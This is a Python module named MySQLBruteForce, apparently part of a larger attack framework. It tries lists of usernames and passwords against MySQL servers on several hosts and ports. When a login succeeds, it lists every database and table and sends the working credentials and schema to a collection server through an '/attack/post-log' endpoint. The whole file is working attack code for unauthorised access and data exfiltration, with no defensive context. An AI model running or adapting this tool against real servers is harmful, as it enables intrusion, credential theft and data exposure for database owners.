# -*- coding: utf-8 -*-
"""
Created on Thu Feb 04 14:21:31 2021

@author: 조서연, GoldBigDragon
"""
import json
import pymysql
from datetime import datetime

import main

global subUrl
subUrl = '/attack/post-log'
global moduleName
moduleName = 'MySQLBruteForce'

global users
global passwords
global hosts
global ports
users = ['root', 'bob', 'user']
passwords = ['', ' ', 'root', 'bob', 'user', 'thisisforyou']
hosts = ['localhost', '192.168.0.1']
ports = [3305, 3306, 3307, 3308]

def successSQL(host, port, user, password) :
    conn = pymysql.connect(host=host, port=port, user=user, passwd=password)
    c = conn.cursor()
    c.execute("SHOW DATABASES")
    databaseInformation = []
    for database in list(c.fetchall()) : 
        database = ("".join(database)).replace("x$","")
        db = pymysql.connect(db=database, host=host, port=port, user=user, passwd=password)
        c2 = db.cursor()
        c2.execute("SHOW TABLES")
        databaseInformation.append(database + ' : ' + ', '.join(list(c2.fetchall())))
        c2.close()
        db.close()
    c.close()
    conn.close()
    sendApiServer('MySQL server ['+host+':'+str(port)+'] ID [' + user + '] PW [' + password + '] DB [' + ' / '.join(databaseInformation) + ']')

def connect(host, port, user, password, timeout):
    success = False
    allowed = True
    connectable = True
    lost_connection = True
    unknown = False
    conn = None
    try:
        conn = pymysql.connect(host=host, port=port, user=user, passwd=password, connect_timeout=timeout)
        success = True
    except Exception as e:
        errno, message = e.args
        if errno == 1130:
            allowed = False
        elif errno == 2002:
            connectable = False
        elif errno == 2005:
            unknown = True
        elif errno == 2013:
            lost_connection = False
    if conn != None:
        conn.close()
    return success, allowed, connectable, unknown, lost_connection

def sendApiServer(message):
    global subUrl
    global moduleName
    nowTime = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    data = {'time': nowTime, 'type': moduleName, 'message': message}
    main.serverSender(subUrl, json.dumps(data))

def start():
    global users
    global passwords
    global hosts
    global ports
    timeout = 3
    availableAddressPair = []
    for host in hosts:
        for port in ports:
            success, allowed, connectable, unknown, lost_connection = connect(host, port, "root", "1234", timeout)
            if (not connectable or lost_connection) or (not allowed) or unknown:
                continue
            availableAddressPair.append([host, port])
    for availableAddress in availableAddressPair:
        for user in users:
            for password in passwords:
                success, allowed, connectable, unknown, lost_connection = connect(availableAddress[0], availableAddress[1], user, password, timeout)
                if success:
                    successSQL(availableAddress[0], availableAddress[1], user, password)
                    break